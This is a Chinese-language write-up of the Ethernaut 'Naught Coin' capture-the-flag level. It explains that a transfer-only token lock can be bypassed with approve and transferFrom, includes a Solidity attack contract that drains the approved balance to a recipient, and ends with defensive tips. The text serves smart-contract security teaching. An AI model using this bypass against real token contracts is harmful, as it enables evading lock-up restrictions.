# Ethernaut-Naught-Coin
Ethernaut Naught Coin解題思路

<img width="1450" height="1340" alt="image" src="https://github.com/user-attachments/assets/92d30e2b-1b78-4006-9641-9db446497aef" />

***這題是要說明transfer不是唯一移轉代幣的方法***

我們可以設計一個攻擊合約並利用原本合約的approve同意讓攻擊合約去執行transferfrom的動作

以下為攻擊合約程式碼：

    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    interface IERC20 {
    function allowance(address _owner, address _spender) external  view returns (uint256 remaining);
    function transferFrom(address _from, address _to, uint256 _value) external   returns (bool success);
    function balanceOf(address account) external view returns (uint256);
    }

    contract hack {
    uint256 amount;
    uint256 allowance;
    IERC20 public ierc20;
    constructor(address _target) {
        ierc20=IERC20(_target);
    }
    function attack(address player,address recipient) public {
        uint256 balance = ierc20.balanceOf(player);
          allowance = ierc20.allowance(player, address(this));
          amount = (allowance < balance)?allowance:balance;
        require(amount > 0, "no allowance or balance");
        ierc20.transferFrom(player, recipient, amount);
    }
    function check2()public view returns (uint256){
        return allowance;
    }
    
    function check()public view returns (uint256){
        return amount;
    }
    }

Tips:

transfer(to, amount):是轉amount給to，要注意這邊用的是自己的錢

transferFrom(from, to, amount)：是用from的錢轉amount給to，但是要先經過approve(to,value)才可以執行該操作，不然會被revert。

approve(to,value)可以想成是我同意to幫我執行價值為value的各種行為

所以如果要防止這種事情發生的話，設計者要讓所有能夠改變餘額的都需要納入考量，並且不要同意無限授權！！！
